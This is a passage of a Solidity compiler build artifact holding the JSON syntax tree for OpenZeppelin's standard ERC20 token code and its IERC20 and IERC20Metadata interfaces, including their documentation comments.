																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																				"typeString": "function (address,address,uint256)"
																			}
																		},
																		"id": 557,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"nameLocations": [],
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "11407:51:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_tuple$__$",
																			"typeString": "tuple()"
																		}
																	},
																	"id": 558,
																	"nodeType": "ExpressionStatement",
																	"src": "11407:51:0"
																}
															]
														}
													]
												}
											}
										]
									},
									"documentation": {
										"id": 521,
										"nodeType": "StructuredDocumentation",
										"src": "10803:270:0",
										"text": " @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n Does not update the allowance amount in case of infinite allowance.\n Revert if not enough allowance is available.\n Might emit an {Approval} event."
									},
									"id": 563,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_spendAllowance",
									"nameLocation": "11087:15:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 528,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 523,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "11111:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 563,
												"src": "11103:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 522,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "11103:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 525,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "11126:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 563,
												"src": "11118:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 524,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "11118:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 527,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "11143:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 563,
												"src": "11135:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 526,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "11135:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "11102:48:0"
									},
									"returnParameters": {
										"id": 529,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "11168:0:0"
									},
									"scope": 586,
									"src": "11078:411:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 573,
										"nodeType": "Block",
										"src": "12162:2:0",
										"statements": []
									},
									"documentation": {
										"id": 564,
										"nodeType": "StructuredDocumentation",
										"src": "11495:573:0",
										"text": " @dev Hook that is called before any transfer of tokens. This includes\n minting and burning.\n Calling conditions:\n - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n will be transferred to `to`.\n - when `from` is zero, `amount` tokens will be minted for `to`.\n - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n - `from` and `to` are never both zero.\n To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks]."
									},
									"id": 574,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_beforeTokenTransfer",
									"nameLocation": "12082:20:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 571,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 566,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "12111:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 574,
												"src": "12103:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 565,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "12103:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 568,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "12125:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 574,
												"src": "12117:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 567,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "12117:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 570,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "12137:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 574,
												"src": "12129:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 569,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "12129:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "12102:42:0"
									},
									"returnParameters": {
										"id": 572,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "12162:0:0"
									},
									"scope": 586,
									"src": "12073:91:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 584,
										"nodeType": "Block",
										"src": "12840:2:0",
										"statements": []
									},
									"documentation": {
										"id": 575,
										"nodeType": "StructuredDocumentation",
										"src": "12170:577:0",
										"text": " @dev Hook that is called after any transfer of tokens. This includes\n minting and burning.\n Calling conditions:\n - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n has been transferred to `to`.\n - when `from` is zero, `amount` tokens have been minted for `to`.\n - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n - `from` and `to` are never both zero.\n To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks]."
									},
									"id": 585,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_afterTokenTransfer",
									"nameLocation": "12761:19:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 582,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 577,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "12789:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "12781:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 576,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "12781:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 579,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "12803:2:0",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "12795:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 578,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "12795:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 581,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "12815:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "12807:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 580,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "12807:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "12780:42:0"
									},
									"returnParameters": {
										"id": 583,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "12840:0:0"
									},
									"scope": 586,
									"src": "12752:90:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "internal"
								}
							],
							"scope": 587,
							"src": "1532:11312:0",
							"usedErrors": []
						}
					],
					"src": "105:12740:0"
				},
				"id": 0
			},
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
					"exportedSymbols": {
						"IERC20": [
							664
						]
					},
					"id": 665,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 588,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "106:23:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "IERC20",
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 589,
								"nodeType": "StructuredDocumentation",
								"src": "131:70:1",
								"text": " @dev Interface of the ERC20 standard as defined in the EIP."
							},
							"fullyImplemented": false,
							"id": 664,
							"linearizedBaseContracts": [
								664
							],
							"name": "IERC20",
							"nameLocation": "212:6:1",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 590,
										"nodeType": "StructuredDocumentation",
										"src": "225:158:1",
										"text": " @dev Emitted when `value` tokens are moved from one account (`from`) to\n another (`to`).\n Note that `value` may be zero."
									},
									"eventSelector": "ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
									"id": 598,
									"name": "Transfer",
									"nameLocation": "394:8:1",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 597,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 592,
												"indexed": true,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "419:4:1",
												"nodeType": "VariableDeclaration",
												"scope": 598,
												"src": "403:20:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 591,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "403:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 594,
												"indexed": true,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "441:2:1",
												"nodeType": "VariableDeclaration",
												"scope": 598,
												"src": "425:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 593,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "425:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 596,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "453:5:1",
												"nodeType": "VariableDeclaration",
												"scope": 598,
												"src": "445:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 595,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "445:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "402:57:1"
									},
									"src": "388:72:1"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 599,
										"nodeType": "StructuredDocumentation",
										"src": "466:148:1",
										"text": " @dev Emitted when the allowance of a `spender` for an `owner` is set by\n a call to {approve}. `value` is the new allowance."
									},
									"eventSelector": "8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
									"id": 607,
									"name": "Approval",
									"nameLocation": "625:8:1",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 606,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 601,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "650:5:1",
												"nodeType": "VariableDeclaration",
												"scope": 607,
												"src": "634:21:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 600,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "634:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 603,
												"indexed": true,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "673:7:1",
												"nodeType": "VariableDeclaration",
												"scope": 607,
												"src": "657:23:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 602,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "657:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 605,
												"indexed": false,
												"mutability": "mutable",
												"name": "value",
												"nameLocation": "690:5:1",
												"nodeType": "VariableDeclaration",
												"scope": 607,
												"src": "682:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 604,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "682:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "633:63:1"
									},
									"src": "619:78:1"
								},
								{
									"documentation": {
										"id": 608,
										"nodeType": "StructuredDocumentation",
										"src": "703:66:1",
										"text": " @dev Returns the amount of tokens in existence."
									},
									"functionSelector": "18160ddd",
									"id": 613,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nameLocation": "783:11:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 609,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "794:2:1"
									},
									"returnParameters": {
										"id": 612,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 611,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 613,
												"src": "820:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 610,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "820:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "819:9:1"
									},
									"scope": 664,
									"src": "774:55:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 614,
										"nodeType": "StructuredDocumentation",
										"src": "835:72:1",
										"text": " @dev Returns the amount of tokens owned by `account`."
									},
									"functionSelector": "70a08231",
									"id": 621,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nameLocation": "921:9:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 617,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 616,
												"mutability": "mutable",
												"name": "account",
												"nameLocation": "939:7:1",
												"nodeType": "VariableDeclaration",
												"scope": 621,
												"src": "931:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 615,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "931:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "930:17:1"
									},
									"returnParameters": {
										"id": 620,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 619,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 621,
												"src": "971:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 618,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "971:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "970:9:1"
									},
									"scope": 664,
									"src": "912:68:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 622,
										"nodeType": "StructuredDocumentation",
										"src": "986:202:1",
										"text": " @dev Moves `amount` tokens from the caller's account to `to`.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "a9059cbb",
									"id": 631,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nameLocation": "1202:8:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 627,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 624,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "1219:2:1",
												"nodeType": "VariableDeclaration",
												"scope": 631,
												"src": "1211:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 623,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1211:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 626,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "1231:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 631,
												"src": "1223:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 625,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1223:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1210:28:1"
									},
									"returnParameters": {
										"id": 630,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 629,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 631,
												"src": "1257:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 628,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1257:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1256:6:1"
									},
									"scope": 664,
									"src": "1193:70:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 632,
										"nodeType": "StructuredDocumentation",
										"src": "1269:264:1",
										"text": " @dev Returns the remaining number of tokens that `spender` will be\n allowed to spend on behalf of `owner` through {transferFrom}. This is\n zero by default.\n This value changes when {approve} or {transferFrom} are called."
									},
									"functionSelector": "dd62ed3e",
									"id": 641,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nameLocation": "1547:9:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 637,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 634,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "1565:5:1",
												"nodeType": "VariableDeclaration",
												"scope": 641,
												"src": "1557:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 633,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1557:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 636,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "1580:7:1",
												"nodeType": "VariableDeclaration",
												"scope": 641,
												"src": "1572:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 635,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1572:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1556:32:1"
									},
									"returnParameters": {
										"id": 640,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 639,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 641,
												"src": "1612:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 638,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1612:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1611:9:1"
									},
									"scope": 664,
									"src": "1538:83:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 642,
										"nodeType": "StructuredDocumentation",
										"src": "1627:642:1",
										"text": " @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n Returns a boolean value indicating whether the operation succeeded.\n IMPORTANT: Beware that changing an allowance with this method brings the risk\n that someone may use both the old and the new allowance by unfortunate\n transaction ordering. One possible solution to mitigate this race\n condition is to first reduce the spender's allowance to 0 and set the\n desired value afterwards:\n https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n Emits an {Approval} event."
									},
									"functionSelector": "095ea7b3",
									"id": 651,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nameLocation": "2283:7:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 647,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 644,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "2299:7:1",
												"nodeType": "VariableDeclaration",
												"scope": 651,
												"src": "2291:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 643,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2291:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 646,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "2316:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 651,
												"src": "2308:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 645,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2308:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2290:33:1"
									},
									"returnParameters": {
										"id": 650,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 649,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 651,
												"src": "2342:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 648,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2342:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2341:6:1"
									},
									"scope": 664,
									"src": "2274:74:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"documentation": {
										"id": 652,
										"nodeType": "StructuredDocumentation",
										"src": "2354:287:1",
										"text": " @dev Moves `amount` tokens from `from` to `to` using the\n allowance mechanism. `amount` is then deducted from the caller's\n allowance.\n Returns a boolean value indicating whether the operation succeeded.\n Emits a {Transfer} event."
									},
									"functionSelector": "23b872dd",
									"id": 663,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nameLocation": "2655:12:1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 659,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 654,
												"mutability": "mutable",
												"name": "from",
												"nameLocation": "2685:4:1",
												"nodeType": "VariableDeclaration",
												"scope": 663,
												"src": "2677:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 653,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2677:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 656,
												"mutability": "mutable",
												"name": "to",
												"nameLocation": "2707:2:1",
												"nodeType": "VariableDeclaration",
												"scope": 663,
												"src": "2699:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 655,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2699:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 658,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "2727:6:1",
												"nodeType": "VariableDeclaration",
												"scope": 663,
												"src": "2719:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 657,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2719:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2667:72:1"
									},
									"returnParameters": {
										"id": 662,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 661,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 663,
												"src": "2758:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 660,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2758:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2757:6:1"
									},
									"scope": 664,
									"src": "2646:118:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 665,
							"src": "202:2564:1",
							"usedErrors": []
						}
					],
					"src": "106:2661:1"
				},
				"id": 1
			},
			"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol",
					"exportedSymbols": {
						"IERC20": [
							664
						],
						"IERC20Metadata": [
							689
						]
					},
					"id": 690,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 666,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "110:23:2"
						},
						{
							"absolutePath": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
							"file": "../IERC20.sol",
							"id": 667,
							"nameLocation": "-1:-1:-1",
							"nodeType": "ImportDirective",
							"scope": 690,
							"sourceUnit": 665,
							"src": "135:23:2",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [
								{
									"baseName": {
										"id": 669,
										"name": "IERC20",
										"nameLocations": [
											"305:6:2"
										],
										"nodeType": "IdentifierPath",
